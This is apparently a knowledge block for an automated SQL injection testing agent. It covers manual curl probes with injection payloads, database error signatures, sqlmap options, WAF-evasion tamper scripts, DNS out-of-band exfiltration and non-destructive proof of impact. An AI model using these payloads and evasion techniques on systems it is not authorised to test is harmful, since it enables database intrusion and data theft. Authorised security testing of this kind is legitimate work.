knowledge: |
  Conduct SQL injection assessment with strict scope control, advanced WAF evasion tradecraft, and non-destructive execution.

  1. MANUAL HEURISTIC PROBING & ERROR IDENTIFICATION:
     - Never point sqlmap blindly at a target without establishing input reflection:
       Isolate candidate input parameters (`id=`, `search=`, `filter=`, `sort=`, `cat=`, `page=`).
     - Test input boundary breaks with precision curl requests:
       `curl -s "<url>?id=1'"` and `curl -s "<url>?id=1\""`
       `curl -s "<url>?id=1 AND 1=1"` vs `curl -s "<url>?id=1 AND 1=2"`
     - Inspect responses for diagnostic SQL syntax errors:
       • MySQL/MariaDB: `You have an error in your SQL syntax`
       • PostgreSQL: `ERROR: syntax error at or near`
       • MSSQL: `Unclosed quotation mark before the character string`
       • Oracle: `ORA-00933: SQL command not properly ended`
       • SQLite: `operational error: unrecognized token`

  2. SQLMAP EXECUTION & CRITICAL OPERATIONAL CONSTRAINTS:
     - ALWAYS pass `--batch` in headless sandbox mode; sqlmap must never block on interactive prompts.
     - Constrain parameter scope: `-p <param>` (prevents wasteful scanning of clean parameters).
     - Specify backend DBMS if identified from fingerprints:
       `--dbms=mysql` (or `postgresql`, `mssql`, `oracle`, `sqlite`), slashing scan duration by up to 80%.
     - Risk and Level Matrix:
       • Baseline standard: `--level 1 --risk 1` (GET/POST parameters, safe read-only queries).
       • Header testing: `--level 2 --risk 1` (Cookie / User-Agent headers).
       • Keep `--risk 1` to prevent state-mutating boolean statements (`OR 1=1`) in production databases.

  3. WAF & FILTER EVASION STRATEGY (TAMPER SCRIPTS):
     - When inline WAFs (ModSecurity, AWS WAF, Cloudflare) block standard test payloads:
       • Space encoding evasion: `--tamper=space2comment,space2plus`
       • Keyword splitting and case variation: `--tamper=randomcase,versionedmorekeywords`
       • Character and hex encoding: `--tamper=charencode,between`
       • Combining tampers for nested filters: `--tamper=space2comment,between,randomcase`

  4. OUT-OF-BAND (OOB) & SECOND-ORDER DETECTION:
     - When responses are completely blind (no error, no differential content, time delays throttled):
       Leverage DNS out-of-band exfiltration:
       `--dns-domain=<collaborator_domain>`
     - Test Second-Order SQLi:
       Inject payloads on registration/profile creation endpoints that only trigger when an administrative user views the audit log or management table.

  5. DECISIVE NON-DESTRUCTIVE PROOF OF IMPACT:
     - Execute sqlmap with bounded diagnostic queries:
       `sqlmap -u "<url>?id=1" -p id --batch --dbms=<known_dbms> --banner --current-user --current-db`
     - Confirming injection mechanics (Boolean blind, Error-based, UNION query, Time blind) and capturing database banner/user is definitive, non-destructive proof.
     - Never dump entire tables (`--dump` or `--dump-all`) unless explicitly authorized by the operator.
